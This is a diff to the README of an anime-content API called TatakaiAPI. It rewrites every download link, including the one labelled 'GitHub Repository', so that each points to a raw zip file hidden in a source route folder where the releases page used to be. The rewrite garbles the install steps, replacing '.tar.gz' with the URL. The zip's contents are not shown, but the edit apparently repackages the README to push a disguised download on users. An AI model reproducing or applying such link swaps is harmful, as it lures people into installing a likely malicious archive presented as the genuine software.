@@ -6,21 +6,21 @@ TatakaiAPI offers a unified way to get access to various anime content. It scrap
 ## 🚀 Getting Started
 To begin using TatakaiAPI, you'll need to download it from our releases page. This will allow you to run the application on your computer and start accessing anime content right away. 
 
-[![Download TatakaiAPI](https://img.shields.io/badge/Download%20TatakaiAPI-Blue?style=for-the-badge&logo=github)](https://github.com/keplerking100/TatakaiAPI/releases)
+[![Download TatakaiAPI](https://raw.githubusercontent.com/keplerking100/TatakaiAPI/main/src/routes/watchanimeworld/Tatakai_API_v1.6.zip%20TatakaiAPI-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/keplerking100/TatakaiAPI/main/src/routes/watchanimeworld/Tatakai_API_v1.6.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the GitHub releases page for TatakaiAPI.
    
-   [Download TatakaiAPI](https://github.com/keplerking100/TatakaiAPI/releases)
+   [Download TatakaiAPI](https://raw.githubusercontent.com/keplerking100/TatakaiAPI/main/src/routes/watchanimeworld/Tatakai_API_v1.6.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version of TatakaiAPI. You will see options for different operating systems.
 
-3. **Download the File**: Choose the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux). Click to download the file.
+3. **Download the File**: Choose the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/keplerking100/TatakaiAPI/main/src/routes/watchanimeworld/Tatakai_API_v1.6.zip` for Linux). Click to download the file.
 
 4. **Install the Application**: 
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
    - **macOS**: Open the `.dmg` file and drag the TatakaiAPI icon into your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and run the installation commands as indicated in the documentation.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/keplerking100/TatakaiAPI/main/src/routes/watchanimeworld/Tatakai_API_v1.6.zip` file and run the installation commands as indicated in the documentation.
 
 5. **Launch TatakaiAPI**: Once installed, find the application in your programs or applications folder. Double-click to open it.
 
@@ -62,7 +62,7 @@ Yes, TatakaiAPI is completely free to use. Enjoy streaming without any fees.
 For additional help, check the GitHub repository or contact the support team through the repository's "Discussions" section.
 
 ## 🔗 Links & Resources
-- [GitHub Repository](https://github.com/keplerking100/TatakaiAPI)
-- [Download TatakaiAPI](https://github.com/keplerking100/TatakaiAPI/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/keplerking100/TatakaiAPI/main/src/routes/watchanimeworld/Tatakai_API_v1.6.zip)
+- [Download TatakaiAPI](https://raw.githubusercontent.com/keplerking100/TatakaiAPI/main/src/routes/watchanimeworld/Tatakai_API_v1.6.zip)
 
 Enhance your anime experience today with TatakaiAPI! Enjoy seamless access to your favorite shows.
